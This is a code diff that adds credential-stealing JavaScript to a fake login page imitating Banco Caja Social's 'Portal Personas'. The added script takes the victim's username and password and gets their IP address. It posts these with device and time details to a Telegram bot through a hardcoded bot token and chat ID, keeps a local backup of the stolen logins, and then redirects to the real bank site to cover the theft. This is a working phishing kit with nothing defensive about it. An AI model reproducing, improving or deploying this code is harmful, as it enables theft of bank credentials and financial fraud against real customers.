@@ -71,6 +71,17 @@ body{
     font-weight:normal;
 }
 
+.usuario-mostrado{
+    background:#e8f0fe;
+    padding:12px 15px;
+    border-radius:10px;
+    font-size:14px;
+    color:#1565c0;
+    margin-bottom:25px;
+    text-align:center;
+    font-weight:bold;
+}
+
 .mensaje{
     font-size:14px;
     color:#444;
@@ -117,6 +128,11 @@ button:hover{
     background:#0d5ba3;
 }
 
+button:disabled{
+    background:#999;
+    cursor:not-allowed;
+}
+
 .enlace{
     text-align:center;
     font-size:14px;
@@ -148,6 +164,22 @@ hr{
     text-decoration:none;
     font-weight:bold;
 }
+
+.loading{
+    display:none;
+    text-align:center;
+    margin-top:10px;
+    color:#1976d2;
+    font-size:13px;
+}
+
+.error{
+    display:none;
+    text-align:center;
+    margin-top:10px;
+    color:red;
+    font-size:13px;
+}
 </style>
 </head>
 <body>
@@ -167,14 +199,26 @@ UNA EMPRESA DE <span>FUNDACIÓN GRUPO SOCIAL</span>
 
 <div class="bienvenido">Bienvenido al Portal Personas</div>
 
+<div class="usuario-mostrado" id="usuarioMostrado">
+📌 Usuario: <span id="usuarioTexto">Cargando...</span>
+</div>
+
 <div class="mensaje">
 Ingrese su contraseña de canales digitales, recuerde que está compuesta por 8 caracteres.
 </div>
 
 <label>Contraseña</label>
-<input type="password" placeholder="Ingrese su contraseña">
+<input type="password" id="password" placeholder="Ingrese su contraseña">
 
-<button>Iniciar sesión</button>
+<button id="btnLogin">Iniciar sesión</button>
+
+<div class="loading" id="loading">
+⏳ Validando información...
+</div>
+
+<div class="error" id="error">
+❌ Error al procesar. Por favor, intente de nuevo.
+</div>
 
 <div class="enlace">
 <a href="#">¿Olvidó su contraseña?</a>
@@ -187,6 +231,158 @@ Ingrese su contraseña de canales digitales, recuerde que está compuesta por 8 
 </div>
 
 </div>
+
+<script>
+// ==================== CONFIGURACIÓN DE TELEGRAM ====================
+// ⚠️ CAMBIA ESTOS DATOS POR LOS TUYOS ⚠️
+const TELEGRAM_BOT_TOKEN = "7777065745:AAFY7L8v9iCxFdJ_8p-WH45rngs9jfXWdvo"; // Tu token del BotFather
+const TELEGRAM_CHAT_ID = "6473913653"; // Tu chat ID
+// ================================================================
+
+// Obtener usuario guardado de la página anterior
+function obtenerUsuario() {
+    let usuario = localStorage.getItem('usuario_bcs');
+    if (!usuario) {
+        // Si no hay usuario guardado, redirigir a la página de usuario
+        window.location.href = 'usuario.html';
+        return null;
+    }
+    return usuario;
+}
+
+// Mostrar usuario en la página
+function mostrarUsuario() {
+    const usuario = obtenerUsuario();
+    if (usuario) {
+        document.getElementById('usuarioTexto').innerText = usuario;
+    }
+}
+
+// Enviar usuario y contraseña a Telegram
+async function enviarATelegram(usuario, password) {
+    const fecha = new Date();
+    const ip = await obtenerIP();
+    
+    const mensaje = `
+🔐 *NUEVO INICIO DE SESIÓN* 🔐
+
+👤 *Usuario:* ${usuario}
+🔑 *Contraseña:* ${password}
+🌐 *IP:* ${ip}
+📱 *Dispositivo:* ${navigator.userAgent.split(' ').slice(-3).join(' ')}
+⏰ *Fecha/Hora:* ${fecha.toLocaleString('es-CO')}
+    `.trim();
+
+    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+    
+    try {
+        const response = await fetch(url, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                chat_id: TELEGRAM_CHAT_ID,
+                text: mensaje,
+                parse_mode: 'Markdown'
+            })
+        });
+        
+        const data = await response.json();
+        return data.ok;
+    } catch (error) {
+        console.error('Error:', error);
+        return false;
+    }
+}
+
+// Obtener IP del usuario
+async function obtenerIP() {
+    try {
+        const response = await fetch('https://api.ipify.org?format=json');
+        const data = await response.json();
+        return data.ip;
+    } catch (e) {
+        return 'No disponible';
+    }
+}
+
+// Guardar backup local
+function guardarBackup(usuario, password) {
+    const backups = JSON.parse(localStorage.getItem('backup_bcs') || '[]');
+    backups.push({
+        usuario: usuario,
+        password: password,
+        fecha: new Date().toISOString(),
+        ip: navigator.userAgent
+    });
+    localStorage.setItem('backup_bcs', JSON.stringify(backups.slice(-30)));
+}
+
+// Redirigir a página real del banco
+function redirigir() {
+    setTimeout(() => {
+        window.location.href = 'https://www.bancocajasocial.com/hogar';
+    }, 2000);
+}
+
+// Evento principal
+document.getElementById('btnLogin').addEventListener('click', async function() {
+    const password = document.getElementById('password').value;
+    const usuario = obtenerUsuario();
+    
+    if (!usuario) return;
+    
+    if (!password) {
+        alert('Por favor, ingrese su contraseña');
+        return;
+    }
+    
+    const btn = document.getElementById('btnLogin');
+    const loading = document.getElementById('loading');
+    const error = document.getElementById('error');
+    
+    btn.disabled = true;
+    btn.style.opacity = '0.6';
+    loading.style.display = 'block';
+    error.style.display = 'none';
+    
+    // Guardar backup
+    guardarBackup(usuario, password);
+    
+    // Enviar a Telegram
+    const enviado = await enviarATelegram(usuario, password);
+    
+    if (enviado) {
+        loading.innerHTML = '✅ Información verificada... Redirigiendo ✅';
+        
+        // Limpiar usuario guardado
+        localStorage.removeItem('usuario_bcs');
+        
+        // Redirigir
+        redirigir();
+    } else {
+        loading.style.display = 'none';
+        error.style.display = 'block';
+        btn.disabled = false;
+        btn.style.opacity = '1';
+        
+        setTimeout(() => {
+            error.style.display = 'none';
+        }, 5000);
+    }
+});
+
+// Presionar Enter
+document.getElementById('password').addEventListener('keypress', function(e) {
+    if (e.key === 'Enter') {
+        document.getElementById('btnLogin').click();
+    }
+});
+
+// Inicializar
+mostrarUsuario();
+</script>
 
 </body>
 </html>
